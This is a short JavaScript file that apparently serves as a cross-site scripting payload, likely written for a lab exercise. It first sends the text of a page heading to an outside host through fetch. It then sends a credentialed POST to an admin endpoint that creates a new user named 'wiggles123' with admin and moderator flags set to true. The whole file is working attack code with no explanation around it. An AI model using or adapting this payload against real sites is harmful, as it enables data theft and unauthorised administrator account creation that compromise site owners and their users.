var h1s = document.getElementsByTagName("h1");
fetch('http://192.168.119.143/'+h1s[1].textContent, {
})

username = "wiggles123"
email = "wiggles123@email.com"
isAdmin = "true"
isMod = "true"
host = 'answers'
host_ip = '192.168.143.251'
fetch(`http://${host_ip}/admin/users/create`, {
    "method":"POST",
    "credentials":"include",
    mode: "cors",
    headers: {
          "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
})